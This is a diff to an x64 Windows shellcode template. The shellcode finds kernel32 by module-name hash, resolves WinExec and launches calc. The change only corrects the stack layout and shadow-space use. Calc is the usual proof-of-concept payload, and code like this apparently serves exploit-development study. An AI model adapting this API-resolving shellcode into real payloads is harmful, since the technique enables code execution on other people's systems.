@@ -60,7 +60,10 @@ _start:
     ; save rsp before alignment so epilogue can restore it exactly
     mov  rbp, rsp
     and  rsp, -16
-    sub  rsp, 0x28          ; 0x20 shadow + 0x8 string slot, keeps 16-byte alignment
+    ; rsp+0x00..0x1F : shadow space 32 bytes
+    ; rsp+0x20..0x27 : calc slot 8 bytes
+    ; rsp+0x28..0x2F : padding 8 bytes, keeps rsp 16-byte aligned
+    sub  rsp, 0x30
 
     ; --- find kernel32 by LDR module name hash ---
     mov  r15d, 0x{K32_HASH:08X}
@@ -73,12 +76,11 @@ _start:
     mov  r12, rax               ; r12 = WinExec
 
     ; --- WinExec(calc, SW_SHOWNORMAL) ---
-    ; "calc" at rsp+0, shadow space rsp+8 to rsp+27 (32 bytes)
-    ; call pushes retaddr: WinExec shadow fits within our 0x28 allocation
-    mov  dword [rsp], 0x636C6163   ; calc little-endian
-    mov  byte  [rsp+4], 0          ; null terminator
-    lea  rcx, [rsp]                ; arg1 = lpCmdLine
-    mov  edx, 1                    ; arg2 = SW_SHOWNORMAL
+    ; calc at rsp+0x20, shadow at new_rsp+0x08..0x27 after call
+    mov  dword [rsp+0x20], 0x636C6163  ; calc little-endian
+    mov  byte  [rsp+0x24], 0           ; null terminator
+    lea  rcx, [rsp+0x20]               ; arg1 = lpCmdLine
+    mov  edx, 1                        ; arg2 = SW_SHOWNORMAL
     call r12
 
     ; --- epilogue: restore and return ---
